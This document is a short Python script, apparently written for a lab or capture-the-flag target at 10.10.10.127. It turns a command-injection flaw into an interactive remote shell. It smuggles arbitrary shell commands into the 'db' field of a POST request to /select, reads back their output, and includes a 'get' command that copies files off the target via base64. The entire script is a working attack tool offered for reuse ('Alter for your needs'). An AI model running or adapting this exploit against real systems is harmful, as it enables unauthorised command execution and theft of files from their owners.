#!/usr/bin/python3
#
# Small RCE Shell using b64encode from OpenBSD
# Alter for your needs
#
import requests
import re
import base64
import html
from cmd import Cmd

url='http://10.10.10.127/select'

class Terminal(Cmd):
	
	def default(self, args):
		print(self.rce(args))	

	def do_get(self, args):
		filename=args.rsplit("/",1)[1]
		with open(filename, mode='bw') as file:
    			file.write(base64.b64decode(self.rce_get64(args)))

	def rce(self, args):
                data = {"db":"all; echo abcd;"+args+" 2>&1;echo efgh"}
                r=requests.post(url, data=data)
                res = re.search(r'abcd(.*?)efgh',r.text,re.DOTALL)
                out = res.group(1)
                return html.unescape(out)
		
	def rce_get64(self, args):
                data = {"db":"all; b64encode "+args+" efGH"}
                r=requests.post(url, data=data)
                res = re.search(r'efGH(.*?)====',r.text,re.DOTALL)
                return res.group(1)
	
	path = rce("","pwd").strip()
	prompt = path+'> '

terminal = Terminal()
print("[*] Simple RCE Shell")
print("[*] URL: "+url)
print("[*] Base: "+terminal.path+"\n")
terminal.cmdloop()
